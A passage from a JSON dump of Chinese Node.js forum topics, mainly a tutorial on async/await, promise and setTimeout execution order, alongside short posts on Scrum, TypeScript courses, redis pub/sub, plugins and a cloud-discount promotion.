和版本发布的标准自动化","last_reply_at":"2018-12-11T01:45:08.143Z","good":false,"top":false,"reply_count":1,"visit_count":825,"create_at":"2018-12-08T13:45:19.171Z","author":{"loginname":"wewoor","avatar_url":"https://avatars0.githubusercontent.com/u/2766811?v=4&s=120"}},{"id":"5c0ddfbe7ec239239ff5533a","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000017224799\">8张图帮你一步步看清 async/await 和 promise 的执行顺序</a></li>\n<li>作者：<a href=\"https://segmentfault.com/u/ziwei3749\">ziwei3749</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<h3>为什么写这篇文章？</h3>\n<p>说实话，关于js的异步执行顺序，宏任务、微任务这些，或者async/await这些慨念已经有非常多的文章写了。</p>\n<p>但是怎么说呢，简单来说，业务中很少用async，不太懂async呢。</p>\n<p>研究了一天，感觉懂了，所手痒想写一篇 ，哈哈。</p>\n<p>毕竟自己学会的知识，如果连表达清楚都做不到，怎么能指望自己用好它呢？</p>\n<h3>测试一下自己有没有必要看</h3>\n<p>所以我写这个的文章，主要还是交流学习，如果您已经清楚了eventloop/async/await/promise这些东西呢，可以 break 啦</p>\n<p>有说的不对的地方，欢迎留言讨论，</p>\n<p>那么还是先通过一道题自我检测一下，是否有必要继续看下去把。</p>\n<p>其实呢，这是去年一道烂大街的「今日头条」的面试题。</p>\n<p>我觉得这道题的关键，不仅是说出正确的打印顺序，更重要的能否说清楚每一个步骤，为什么这样执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>async function async1() {\n    console.log(&quot;async1 start&quot;);\n    await async2();\n    console.log(&quot;async1 end&quot;);\n}\n\nasync function async2() {\n    console.log(&quot;async2&quot;);\n}\n\nconsole.log(&quot;script start&quot;);\n\nsetTimeout(function() {\n    console.log(&quot;setTimeout&quot;);\n}, 0);\n\nasync1();\n\nnew Promise(function(resolve) {\n    console.log(&quot;promise1&quot;);\n    resolve();\n}).then(function() {\n    console.log(&quot;promise2&quot;);\n});\n\nconsole.log(&quot;script end&quot;);\n</code></pre><blockquote>\n<p>注：因为是一道前端面试题，所以答案是以浏览器的eventloop机制为准的，在node平台上运行会有差异。</p>\n</blockquote>\n<pre class=\"prettyprint language-javascript\"><code>script start\nasync1 start\nasync2\npromise1\nscript end\npromise2\nasync1 end\nsetTimeout\n</code></pre><p>如果你发现运行结果跟自己想的一样，可以选择跳过这篇文章啦，</p>\n<p>或者如果你有兴趣看看俺俩的理解有没有区别，可以跳到后面的 「画图讲解的部分」</p>\n<h3>需要具备的前置知识</h3>\n<ul>\n<li>promise的使用经验</li>\n<li>浏览器端的eventloop</li>\n</ul>\n<p>不过如果是对 ES7 的 async 不太熟悉，是没关系的哈，因为这篇文章会详解 async。</p>\n<p>那么如果不具备这些知识呢，推荐几篇我觉得讲得比较清楚的文章</p>\n<ul>\n<li><a href=\"https://segmentfault.com/a/1190000012806637\">《10分钟理解JS引擎的执行机制》</a>：这是我之前写的讲解eventloop的文章，我觉得还算清晰，但是没涉及 async</li>\n<li><a href=\"https://segmentfault.com/a/1190000007535316\">《理解 JavaScript 的 async/await》</a>：这是我读过的讲async await最清楚的文章</li>\n<li><a href=\"http://es6.ruanyifeng.com/#docs/promise\">《ECMAScript 6 入门 - Promise 对象》</a>：promise就推荐阮一峰老师的ES6吧，不过不熟悉 promise 的应该较少啦。</li>\n</ul>\n<h2>主要内容</h2>\n<h3>第1部分：对于async await的理解</h3>\n<p>我推荐的那篇文章，对 async/await 讲得更详细。不过我希望自己能更加精炼的帮你理解它们这部分，主要会讲解 3 点内容</p>\n<ul>\n<li>async 做一件什么事情？</li>\n<li>await 在等什么？</li>\n<li>await 等到之后，做了一件什么事情？</li>\n<li>async/await 比 promise有哪些优势？（回头补充）</li>\n</ul>\n<h4>async 做一件什么事情？</h4>\n<p><strong>带 async 关键字的函数，它使得你的函数的返回值必定是 promise 对象</strong></p>\n<p>也就是</p>\n<p>如果async关键字函数返回的不是promise，会自动用Promise.resolve()包装</p>\n<p>如果async关键字函数显式地返回promise，那就以你返回的promise为准</p>\n<p>这是一个简单的例子，可以看到 async 关键字函数和普通函数的返回值的区别</p>\n<pre class=\"prettyprint language-javascript\"><code>async function fn1(){\n    return 123\n}\n\nfunction fn2(){\n    return 123\n}\n\nconsole.log(fn1())\nconsole.log(fn2())\nPromise {&lt;resolved&gt;: 123}\n\n123\n</code></pre><p>所以你看，async 函数也没啥了不起的，以后看到带有 async 关键字的函数也不用慌张，你就想它无非就是把return值包装了一下，其他就跟普通函数一样。</p>\n<p>关于async关键字还有那些要注意的？</p>\n<ul>\n<li>在语义上要理解，async表示函数内部有异步操作</li>\n<li>另外注意，一般 await 关键字要在 async 关键字函数的内部，await 写在外面会报错。</li>\n</ul>\n<h4>await 在等什么？</h4>\n<p><strong>await等的是右侧「表达式」的结果</strong></p>\n<p>也就是说，</p>\n<p>右侧如果是函数，那么函数的return值就是「表达式的结果」</p>\n<p>右侧如果是一个 ‘hello’ 或者什么值，那表达式的结果就是 ‘hello’</p>\n<pre class=\"prettyprint language-javascript\"><code>async function async1() {\n    console.log( &#x27;async1 start&#x27; )\n    await async2()\n    console.log( &#x27;async1 end&#x27; )\n}\nasync function async2() {\n    console.log( &#x27;async2&#x27; )\n}\nasync1()\nconsole.log( &#x27;script start&#x27; )\n</code></pre><p>这里注意一点，可能大家都知道await会让出线程，阻塞后面的代码，那么上面例子中， ‘async2’ 和 ‘script start’ 谁先打印呢？</p>\n<p>是从左向右执行，一旦碰到await直接跳出, 阻塞async2()的执行？</p>\n<p>还是从右向左，先执行async2后，发现有await关键字，于是让出线程，阻塞代码呢？</p>\n<p><strong>实践的结论是，从右向左的。先打印async2，后打印的script start</strong></p>\n<p>之所以提一嘴，是因为我经常看到这样的说法，「一旦遇到await就立刻让出线程，阻塞后面的代码」</p>\n<p>这样的说法，会让我误以为，await后面那个函数， async2()也直接被阻塞呢。</p>\n<h4>await 等到之后，做了一件什么事情？</h4>\n<p>那么右侧表达式的结果，就是await要等的东西。</p>\n<p>等到之后，对于await来说，分2个情况</p>\n<ul>\n<li>不是promise对象</li>\n<li>是promise对象</li>\n</ul>\n<p><strong>如果不是 promise , await会阻塞后面的代码，先执行async外面的同步代码，同步代码执行完，再回到async内部，把这个非promise的东西，作为 await表达式的结果</strong></p>\n<p><strong>如果它等到的是一个 promise 对象，await 也会暂停async后面的代码，先执行async外面的同步代码，等着 Promise 对象 fulfilled，然后把 resolve 的参数作为 await 表达式的运算结果。</strong></p>\n<h3>第2部分：画图一步步看清宏任务、微任务的执行过程</h3>\n<p>我们以开篇的经典面试题为例，分析这个例子中的宏任务和微任务。</p>\n<pre class=\"prettyprint language-javascript\"><code>async function async1() {\n    console.log(&quot;async1 start&quot;);\n    await async2();\n    console.log(&quot;async1 end&quot;);\n}\n\nasync function async2() {\n    console.log(&quot;async2&quot;);\n}\n\nconsole.log(&quot;script start&quot;);\n\nsetTimeout(function() {\n    console.log(&quot;setTimeout&quot;);\n}, 0);\n\nasync1();\n\nnew Promise(function(resolve) {\n    console.log(&quot;promise1&quot;);\n    resolve();\n}).then(function() {\n    console.log(&quot;promise2&quot;);\n});\n\nconsole.log(&quot;script end&quot;);\n</code></pre><p>先分享一个我个人理解的宏任务和微任务的慨念，在我脑海中宏任务和为微任务如图所示</p>\n<p><img src=\"https://image.fundebug.com/2018-12-10-01.png\" alt></p>\n<p>也就是「宏任务」、「微任务」都是队列。</p>\n<p>一段代码执行时，会先执行宏任务中的同步代码，</p>\n<ul>\n<li>如果执行中遇到setTimeout之类宏任务，那么就把这个setTimeout内部的函数推入「宏任务的队列」中，下一轮宏任务执行时调用。</li>\n<li>如果执行中遇到promise.then()之类的微任务，就会推入到「当前宏任务的微任务队列」中，在本轮宏任务的同步代码执行都完成后，依次执行所有的微任务1、2、3</li>\n</ul>\n<p>下面就以面试题为例子，分析这段代码的执行顺序。</p>\n<p>每次宏任务和微任务发生变化，我都会画一个图来表示他们的变化。</p>\n<h4>直接打印同步代码 console.log(‘script start’)</h4>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; 首先是2个函数声明，虽然有async关键字，但不是调用我们就不看。然后首先是打印同步代码 \nconsole.log(&#x27;script start&#x27;)\n</code></pre><p><img src=\"https://image.fundebug.com/2018-12-10-02.png\" alt></p>\n<h4>将setTimeout放入宏任务队列</h4>\n<p>默认&lt;script&gt;&lt;/script&gt;所包裹的代码，其实可以理解为是第一个宏任务，所以这里是宏任务2</p>\n<p><img src=\"https://image.fundebug.com/2018-12-10-03.png\" alt></p>\n<h4>调用async1，打印 同步代码 console.log( ‘async1 start’ )</h4>\n<p>我们说过看到带有async关键字的函数，不用害怕，它的仅仅是把return值包装成了promise，其他并没有什么不同的地方。所以就很普通的打印 console.log( ‘async1 start’ )</p>\n<p><img src=\"https://image.fundebug.com/2018-12-10-04.png\" alt></p>\n<h4>分析一下 await async2()</h4>\n<p>前文提过await，1.它先计算出右侧的结果，2.然后看到await后，中断async函数</p>\n<ul>\n<li>先得到await右侧表达式的结果。执行async2()，打印同步代码console.log(‘async2’), 并且return Promise.resolve(undefined)</li>\n<li>await后，中断async函数，先执行async外的同步代码</li>\n</ul>\n<p>目前就直接打印 console.log(‘async2’)</p>\n<p><img src=\"https://image.fundebug.com/2018-12-10-05.png\" alt></p>\n<h4>被阻塞后，要执行async之外的代码</h4>\n<p>执行new Promise()，Promise构造函数是直接调用的同步代码，所以 console.log( ‘promise1’ )</p>\n<p><img src=\"https://image.fundebug.com/2018-12-10-06.png\" alt></p>\n<h4>代码运行到promise.then()</h4>\n<p>代码运行到promise.then()，发现这个是微任务，所以暂时不打印，只是推入当前宏任务的微任务队列中。</p>\n<p><strong>注意：这里只是把promise2推入微任务队列，并没有执行。微任务会在当前宏任务的同步代码执行完毕，才会依次执行</strong></p>\n<p><img src=\"https://image.fundebug.com/2018-12-10-07.png\" alt></p>\n<h4>打印同步代码 console.log(‘script end’)</h4>\n<p>没什么好说的。执行完这个同步代码后，「async外的代码」终于走了一遍</p>\n<p>下面该回到 await 表达式那里，执行await Promise.resolve(undefined)了</p>\n<p><img src=\"https://image.fundebug.com/2018-12-10-08.png\" alt></p>\n<h4>回到async内部，执行await Promise.resolve(undefined)</h4>\n<p>这部分可能不太好理解，我尽量表达我的想法。</p>\n<p>对于 await Promise.resolve(undefined) 如何理解呢？</p>\n<p>根据 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/await\">MDN</a> 原话我们知道</p>\n<p><strong>如果一个 Promise 被传递给一个 await 操作符，await 将等待 Promise 正常处理完成并返回其处理结果。</strong></p>\n<p>在我们这个例子中，就是Promise.resolve(undefined)正常处理完成，并返回其处理结果。那么await async2()就算是执行结束了。</p>\n<p>目前这个promise的状态是fulfilled，等其处理结果返回就可以执行await下面的代码了。</p>\n<p>那何时能拿到处理结果呢？</p>\n<p>回忆平时我们用promise，调用resolve后，何时能拿到处理结果？是不是需要在then的第一个参数里，才能拿到结果。</p>\n<p>（调用resolve时，会把then的参数推入微任务队列，等主线程空闲时，再调用它）</p>\n<p>所以这里的 await Promise.resolve() 就类似于</p>\n<pre class=\"prettyprint language-javascript\"><code>Promise.resolve(undefined).then((undefined) =&gt; {\n\n})\n</code></pre><p>把then的第一个回调参数 (undefined) =&gt; {} 推入微任务队列。</p>\n<p>then执行完，才是await async2()执行结束。</p>\n<p>await async2()执行结束，才能继续执行后面的代码</p>\n<p>如图</p>\n<p><img src=\"https://image.fundebug.com/2018-12-10-09.png\" alt></p>\n<p>此时当前宏任务1都执行完了，要处理微任务队列里的代码。</p>\n<p>微任务队列，先进先出的原则，</p>\n<ul>\n<li>执行微任务1，打印promise2</li>\n<li>执行微任务2，没什么内容…</li>\n</ul>\n<p>但是微任务2执行后，await async2()语句结束，后面的代码不再被阻塞，所以打印</p>\n<p>console.log(‘async1 end’)</p>\n<h4>宏任务1执行完成后,执行宏任务2</h4>\n<p>宏任务2的执行比较简单，就是打印</p>\n<p>console.log(‘setTimeout’)</p>\n<h3>补充在不同浏览器上的测试结果</h3>\n<p>谷歌浏览器，目前是版本是「版本 71.0.3578.80（正式版本） （64 位）」 Mac操作系统</p>\n<p><img src=\"https://image.fundebug.com/2018-12-10-10.png\" alt></p>\n<p>Safari浏览器的测试结果</p>\n<p><img src=\"https://image.fundebug.com/2018-12-10-11.png\" alt></p>\n<p>火狐浏览器的测试结果</p>\n<p><img src=\"https://image.fundebug.com/2018-12-10-12.png\" alt></p>\n<p>如果不理解可以留言，有错误的话也欢迎指正。</p>\n</div>","title":"8张图让你一步步看清 async/await 和 promise 的执行顺序","last_reply_at":"2018-12-11T01:36:17.439Z","good":false,"top":false,"reply_count":4,"visit_count":1031,"create_at":"2018-12-10T03:38:38.792Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c0d4cdc7ec239239ff5516b","author_id":"5a9a256b2ffb8598445aeabb","tab":"share","content":"<div class=\"markdown-text\"><p>今天整理了下微信第三方授权的内容,包括整理的接口调用流程和一些注意常见问题</p>\n<p>有兴趣的可以查看: <a href=\"https://www.jianshu.com/p/67836ffa96cb\">https://www.jianshu.com/p/67836ffa96cb</a></p>\n</div>","title":"微信第三方平台-授权流程经验分享","last_reply_at":"2018-12-10T16:23:24.104Z","good":false,"top":false,"reply_count":2,"visit_count":694,"create_at":"2018-12-09T17:11:56.917Z","author":{"loginname":"keith666666","avatar_url":"https://avatars1.githubusercontent.com/u/14068334?v=4&s=120"}},{"id":"5c0dd4167ec239239ff552d9","author_id":"5c0cb636f3d48d2397c0f53a","tab":"share","content":"<div class=\"markdown-text\"><p>Install\n$ npm i egg-mssql2es --save\nUsage\n// {app_root}/config/plugin.js\nexports.mssql2es = {\nenable: true,\npackage: ‘egg-mssql2es’,\n};\nConfiguration\n// {app_root}/config/config.default.js\nexports.mssql2es = {\n};\nsee config/config.default.js for more detail.</p>\n<p><a href=\"https://github.com/shz8/egg-mssql2es\">https://github.com/shz8/egg-mssql2es</a>\n发个帖试试</p>\n</div>","title":"从mssql同步数据到es的eggjs插件","last_reply_at":"2018-12-10T14:25:47.460Z","good":false,"top":false,"reply_count":1,"visit_count":590,"create_at":"2018-12-10T02:48:54.366Z","author":{"loginname":"shz8","avatar_url":"https://avatars3.githubusercontent.com/u/8197445?v=4&s=120"}},{"id":"5c0b3d6c15a4d545e3f4c65c","author_id":"5bdb0d98646a05745b7b71f8","tab":"share","content":"<div class=\"markdown-text\"><p>阿里云年未钜惠，云产品低至 2 折\n5000条短信包 200元(赚支付宝红包利器)\n2核8G云3M带宽SSD盘 1500元\n更有底价高端机型\n更多优惠可见：\n<a href=\"https://t.2pm.me/ali\">https://t.2pm.me/ali</a></p>\n</div>","title":"昨天阿里官方的人说可推广短信包，并指名最近的支付宝红包，所以没上车的朋友可以上起来了","last_reply_at":"2018-12-10T09:04:22.028Z","good":false,"top":false,"reply_count":2,"visit_count":851,"create_at":"2018-12-08T03:41:32.943Z","author":{"loginname":"vyf","avatar_url":"https://avatars0.githubusercontent.com/u/33199055?v=4&s=120"}},{"id":"5c0de4157ec239239ff55370","author_id":"57b27cbac4e3faf275fcb597","tab":"ask","content":"<div class=\"markdown-text\"><p>两种方式\nnode --arg file\nnode file --arg\n不知道是什么区别。\n现在知道的是webstorm启动配置中有 node parameter 和 application parameter 两个。启动时 node parameter 会出现在文件名之前，application parameter 会出现在文件名之后。放错位置会不生效。</p>\n</div>","title":"node命令行参数放在文件名前后的区别","last_reply_at":"2018-12-10T08:54:45.955Z","good":false,"top":false,"reply_count":2,"visit_count":646,"create_at":"2018-12-10T03:57:09.372Z","author":{"loginname":"easezhi","avatar_url":"https://avatars1.githubusercontent.com/u/7664672?v=4&s=120"}},{"id":"5c0e1598f3d48d2397c0f9fd","author_id":"5acf8345464b1bfa6b4250a4","tab":"ask","content":"<div class=\"markdown-text\"><p>使用redis做一个简单的消息队列\n比如我有10个进程去订阅了某个消息，正常情况一旦有消息过来，我10个进程会同时得到这个消息，然后同时去处理。但是我只想由一个线程来处理。请问redis的队列功能是否可以做到。\n看过egg.js的文档，好像他们的处理方式是指定一个专用的进程来订阅消息，然后再由这个进程自动的分配给不同的进程去处理。</p>\n</div>","title":"redis 一个发布者多个订阅者，请问是否可以只让一个订阅者接收到？","last_reply_at":"2018-12-10T08:43:02.867Z","good":false,"top":false,"reply_count":5,"visit_count":730,"create_at":"2018-12-10T07:28:24.517Z","author":{"loginname":"pzzcn","avatar_url":"https://avatars1.githubusercontent.com/u/34960683?v=4&s=120"}},{"id":"5c078c47d3b8ab334e8db0fc","author_id":"58d83c586f8b9bf02d1d0b1d","tab":"ask","content":"<div class=\"markdown-text\"><p>技术学成大牛 然后突然被时代淘汰</p>\n</div>","title":"以前的顶级塞班工程师现在如何了","last_reply_at":"2018-12-10T07:25:22.682Z","good":false,"top":false,"reply_count":6,"visit_count":1690,"create_at":"2018-12-05T08:28:55.949Z","author":{"loginname":"ResJay","avatar_url":"https://avatars0.githubusercontent.com/u/26635410?v=4&s=120"}},{"id":"5c0992fdd3b8ab334e8db9a1","author_id":"58dc892303d476b42d34c8bd","tab":"share","content":"<div class=\"markdown-text\"><p>WebAssembly 是一种新兴的网页虚拟机标准，它的设计目标包括高可移植性、高安全性、高效率（包括载入效率和运行效率）、尽可能小的程序体积。本书详尽介绍了 WebAssembly 程序在 JavaScript 环境下的使用方法、WebAssembly 汇编语言和二进制格式，给出了大量简单易懂的示例，同时以 C/C++和 Go 语言开发环境为例，介绍了如何使用其他高级语言开发 WebAssembly 模块。</p>\n<p>详细信息可以参考 人民邮电出版社·异步社区的页面： <a href=\"https://www.epubit.com/book/detail/40619\">https://www.epubit.com/book/detail/40619</a>\n京东自营的页面也可以购买：<a href=\"https://item.jd.com/12499372.html\">https://item.jd.com/12499372.html</a></p>\n<p><img src=\"//static.cnodejs.org/FtYqhKnx01Ej9eXj8umfMOD7xj2R\" alt=\"A20181946.jpg\"></p>\n</div>","title":"《WebAssembly标准入门》开始预售了，欢迎关注","last_reply_at":"2018-12-10T04:00:18.049Z","good":false,"top":false,"reply_count":7,"visit_count":1043,"create_at":"2018-12-06T21:22:05.438Z","author":{"loginname":"chai2010","avatar_url":"https://avatars1.githubusercontent.com/u/2295542?v=4&s=120"}},{"id":"5b87741b2a585e4e2f26ffe6","author_id":"511350f6df9e9fcc58856443","tab":"share","content":"<div class=\"markdown-text\"><h3>前言</h3>\n<p>互联网时代，产品迭代速度快，传统的瀑布流开发模型已经无法满足产品快速开发的需求，敏捷开发的思想应运而生。<br>\n考拉技术团队在CEO的大力推行下，一直沿用scrum开发模型，保证产品每周一次的迭代。今天我们先来入个门，了解下scrum模型的基本内容。</p>\n<h3>一、传统开发模型</h3>\n<p>在开始介绍scrum模型之前，我们先来回顾下之前软件开发模式。<br>\n起初，软件开发最基础的模型叫做瀑布模型（<strong>Waterfall Model</strong>）。瀑布模型式是最典型的预见性的方法，严格遵循预先计划的需求分析、设计、编码、集成、测试、维护的步骤顺序进行。瀑布模型下的产品开发各部分都是独立分开，各不干扰，一般适应于大型软件。\n但瀑布模型也存在不能在开发过程更改需求、无法赶上变化迅速的市场，容易造成资源浪费等缺点。<br>\n在这个基础上，引入敏捷开发模型对于小开发团队来说是比较合适的。<br>\n<img src=\"//static.cnodejs.org/Fo4o88qn-J3KPciRGm2s_rSuwNz0\" alt=\"waterfall模式.png\"><br>\n<img src=\"//static.cnodejs.org/Fn9V84ArKu4a59tjNVr9shv1wY6s\" alt=\"waterfall模式缺点.png\"></p>\n<h3>二、scrum的简介</h3>\n<p><strong>敏捷开发是一种以人为核心、迭代、循序渐进的开发方法。</strong></p>\n<p>Scrum作为敏捷的方法之一，用不断迭代的框架方法来管理复杂产品的开发。</p>\n<p>原词来自于橄榄球中“带球过人”。在橄榄球比赛的每次冲刺前，都将有一个计划安排的过程，但冲刺开始后则由队员在原计划的基础上随机应发。<br>\n<img src=\"//static.cnodejs.org/FkEWkcu2nOklMT2WOfZGUA6-Pn7N\" alt=\"scrum原意.jpg\"></p>\n<h3>三、scrum的优势</h3>\n<p>灵活性、适应需求变化、更适合团队比较小的情况、每一个迭代均有产出，容易学习。<br>\n<strong>Why choose Scrum？</strong> 原因如下 （敏捷宣言）：</p>\n<ol>\n<li>\n<p>个体交互重于过程和工具；</p>\n</li>\n<li>\n<p>可用的软件重于完备的文档；</p>\n</li>\n<li>\n<p>客户协作重于合同谈判；</p>\n</li>\n<li>\n<p>响应变化重于遵循计划。</p>\n</li>\n</ol>\n<p>概况地说，它适用于快速变化的市场，可以根据客户不断更换的需求，调整产品的方向，按时交付客户想要的产品。这在今天竞争激烈的市场来说，优先于竞争对手交付一个不完美但能不断改进优化的产品是非常重要的。</p>\n<h3>四、scrum中3个关键角色</h3>\n<p>scrum团队的成员由开发人员、测试人员以及其他帮助研发的人组成：<br>\n核心团队：</p>\n<ul>\n<li>Scrum Master——项目负责人，帮助团队完成工作，组织日常会议和保障其他工作展开；</li>\n<li>Team——开发人员，经常扮演多种角色，开发人员兼职测试，测试人员搬砖文案；</li>\n<li>Product Owner——产品负责人，确定产品特性，提出产品亮点。<br>\nscrum团队的规模不宜过大，一般在3-9人为佳。\n<img src=\"//static.cnodejs.org/FpLsqKbbt2pmJwKiKNJjGJw-BaUd\" alt=\"scrum角色.png\"></li>\n</ul>\n<h3>五、scrum流程</h3>\n<p><img src=\"//static.cnodejs.org/Ftve8j0KvkAgo82xv5LXda7wbpsp\" alt=\"scrum流程.jpg\"></p>\n<ol>\n<li>建立Product Backlog<br>\n记录已知需求并调整。<br>\n在整个开发过程中，Product Owner要不断的把已知的所有需求记录到这里面来，任何时间或步骤中产生的新需求都需要进行更新。scrum团队总是先开发对需求方具有较高价值的需求。<br>\n需求方为了能更加清晰表达需求，可用<strong>user story</strong>描述需求。user story是从用户/需求方的角度对产品的某个功能进行的简短描述，具体格式如下：<br>\n<img src=\"//static.cnodejs.org/Fi0FBdfKrkq6UtSMaEyEGaE19Bg_\" alt=\"微信图片_20180830111107.png\"><br>\n一个story的大小以及复杂度应以能在一个sprint中完成为宜。如果user story横跨了几个sprint，那个就需要进行分解成若干个task（任务），每个task的时间最好不要超过8小时.</li>\n<li>Sprint Planning<br>\n在scrum中，sprint定义为产品的迭代周期。一般是1~6周。在一个sprint开始前，定义本次sprint要讨论的backlo为sprint backlog.\n它是团队在sprint要完成的任务。<br>\n为了确定团队内部任务以及具体分工，需要进行sprint planing，由Scrum Master决定需求，然后将任务拆分，估时，并完成分配。当任务分配之后，要记录到sprint backlog中。在sprint中，scrum团队从backlog中挑选最高优先级的需求进行开发。\n在每次例会之后，由Scrum Master更新backlog。</li>\n<li>Daily Scrum<br>\n也称为每日站会，一般不超过15min。参会的成员由核心团队的成员组成，每个人只说3个问题：<br>\n<strong>今天完成了哪些任务？\n明天的任务是什么？\n今天遇到了哪些问题？</strong><br>\n每日站会的主要作用是update整个团队的进度，会上成员提出的问题不进行详细讨论，会议后master对这些问题进行解决。</li>\n<li>Sprint Review<br>\n总结sprint的会议，在会议上会将本次sprint的新功能展示出来，并收取反馈，为下一次新的需求做准备。</li>\n<li>Retrospective Meeting<br>\n反思sprint的会议，目的是回顾sprint过程组内成员的表现。为了让成员能够更加真实反思自己的工作情况，安全的讨论环境是必须的。在回顾会议上，主要做这三件事情：<br>\ngood–如果我们可以重做同一个sprint，哪些做法是可以保留的？<br>\ncould have done better–如果我们可以重做同一个sprint，哪些做法需要改变？<br>\nimprovement–如何改进的具体想法？</li>\n</ol>\n<h3>六、scrum工具</h3>\n<ol>\n<li>\n<p>任务板<br>\n任务板用可视化方式展示，将一个sprint分为四个阶段：<br>\nProduct Backlog：按照需求的优先级，将团队在sprint中要进行的backlog放在该列；<br>\nTo Do ：将当前sprint需要完成的任务放入该列；<br>\nIn Progress：当团队开发进行某个任务之后，便将任务对应的卡片放到该列中。如果该任务在该列中所处时间超过1天，则应该将任务拆分为更小的部分，并将新任务放到该列中，移出原有的任务。若一个新任务因某个障碍无法完成，master就会将其标记为障碍，用特定红点标记。<br>\nDone：完成一个任务之后，便将任务放到该列。继续开始下一个任务。<br>\n看板（kanban）开发方法作为一种敏捷方式，在改善协助，优化管理、提高交付速度、质量以及灵活性方面有显著作用。下篇文章会着重讲述kanban开发模型在技术团队中的应用。<br>\n<img src=\"//static.cnodejs.org/Fune4wceTm4prLLmJAiVj-2PnfxS\" alt=\"看板.png\"></p>\n</li>\n<li>\n<p>燃尽图<br>\nsprint的开发时间需要团队跟进，燃尽图可以帮助团队评估sprint开发任务的时间以及效率。<br>\n燃尽图是以图表展示随着时间的减少工作量的完成情况。燃尽图的横轴表示整个Sprint 的总时间，纵轴表示 Sprint 中所有的任务，其单位可以是小时，人天等。\n为了更好表示任务开发情况，团队每天要更新燃尽图，并且要根据燃尽图中任务的完成情况对任务进行调整：如果燃尽图一直是上升状态，或当 Sprint 进行一段时间之后，Sprint 燃尽图上的Y值仍然与 Sprint 刚开始时相差无几，就说明这个 Sprint 中的 Story 过多，要拿掉一些 Story 以保证这个 Sprint 能顺利完成。 如果Sprint 燃尽图下降得很快，例如 Sprint 刚过半时Y值已经接近0了，则说明这个 Sprint 分配的任务太少，还要多加一些任务进来。<br>\n为了方便管理燃尽图，在设计燃尽图的时候，从简出发。<br>\n<img src=\"//static.cnodejs.org/FmuGgZgD6WsPAMKqZMKcJPZgw4fp\" alt=\"燃尽图.png\"></p>\n</li>\n<li>\n<p>Jira<br>\n作为敏捷团队用来管理开发项目流程以及进展的工具，Jira提供了丰富的功能，方便开发团队对开发中的问题进行记录跟踪，并通过可视化图表展现出来。当团队进行一次sprint时，Jira会帮你记录任务的完成状态，团队的分工情况以及完成情况。，支持将任务简化，把开发时间分配到每个具体任务中，在规定的时间内完成任务。这与敏捷开发的思想不谋而合。</p>\n</li>\n</ol>\n<h3>七、结束语</h3>\n<p>尽管scrum很美好很轻量，但是这种模型不一定适用于所有的企业。为了保持产品的快速优化，团队在进行敏捷开发模式的同时，还应该注重敏捷开发过程的不断优化。敏捷的出发点是为了提高工作效率，以人为本。没有谁的敏捷之路是一帆风顺，不断优化，小步快跑的方式才是敏捷可行的路。</p>\n</div>","title":"AI考拉技术分享--Scrum入门","last_reply_at":"2018-12-10T03:46:54.878Z","good":false,"top":false,"reply_count":5,"visit_count":969,"create_at":"2018-08-30T04:35:39.275Z","author":{"loginname":"kalengo","avatar_url":"https://avatars2.githubusercontent.com/u/8817810?v=4&s=120"}},{"id":"5b84ff5bfad9359e2e831278","author_id":"5b5e7df5673571454c633cf5","tab":"share","content":"<div class=\"markdown-text\"><p>免费下载地址：<a href=\"https://www.itying.com/goods-905.html\">网盘下载地址</a></p>\n<p><strong>18年6月出的 免费的 Typescript精讲视频教程目录如下：</strong>（课件  源码  高清视频教程）</p>\n<p>01 Typescript介绍 、Typescript安装、Typescript开发工具(15分51秒）</p>\n<p>02 Typescript 中的数据类型  布尔类型（boolean）数字类型（number）字符串类型(string) 数组类型（array） 元组类型（tuple）枚举类型（enum） （上）（20分29秒）</p>\n<p>03 Typescript中的数据类型 任意类型（any） null 和 undefined  void类型  never类型（下）（16分6秒）</p>\n<p>04 Typescript中的函数  函数的定义 可选参数  默认参数   剩余参数  函数重载  箭头函数（31分50秒）</p>\n<p>05 Typescript中的类 Es5中的类和静态方法 继承（原型链继承、对象冒充继承、原型链+对象冒充组合继承）（20分40秒）</p>\n<p>06 Typescript中的类  类的定义 继承 类里面的修饰符（上）（29分4秒）</p>\n<p>07 Typescript中的类  类中的静态属性 静态方法 抽象类 多态（下）（27分52秒）</p>\n<p>08 Typescript中的接口的用途 以及属性类型接口（19分46秒）</p>\n<p>09 Typescript中的属性类型接口【案例】 定义Ajax请求数据的接口 ts封装ajax（8分）</p>\n<p>10 Typescript中的函数类型口 【案例】 加密方法约束（5分11秒）</p>\n<p>11 Typescript中的可索引接口 类类型接口（12分2秒）</p>\n<p>12 TypeScript中接口扩展、接口的继承（7分19秒）</p>\n<p>13 TypeScript中的泛型 泛型变量  泛型类（22分54秒）</p>\n<p>14 TypeScript的泛型接口 泛型类接口（8分42秒）</p>\n</div>","title":"18年6月出的 免费的 Typescript精讲视频教程","last_reply_at":"2018-12-10T02:22:53.364Z","good":false,"top":false,"reply_count":5,"visit_count":1365,"create_at":"2018-08-28T07:52:59.463Z","author":{"loginname":"fengcaizl","avatar_url":"https://avatars3.githubusercontent.com/u/41882858?v=4&s=120"}},{"id":"5c0dccdaf3d48d2397c0f806","author_id":"5639e5516d966e1a39996b1a","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://github.com/leinov/react-multi-page-app\">react-multi-page-app</a>是一个基于react和webpack的多页面应用架构，1.3.0版本对项目整体做了一个全面的升级，添加修改的以下几个方面：</p>\n<ul>\n<li>增加项目创建命令rppx-cli</li>\n<li>创建<a href=\"http://www.h5cool.com/react-multi-page-app/demo/\">Demo展示页面</a></li>\n<li>完善修改REAMDME（中文/英文）</li>\n<li>增加了redux的使用</li>\n<li>优化目录结构</li>\n<li>优化整体代码</li>\n</ul>\n<h3>github 地址</h3>\n<p><a 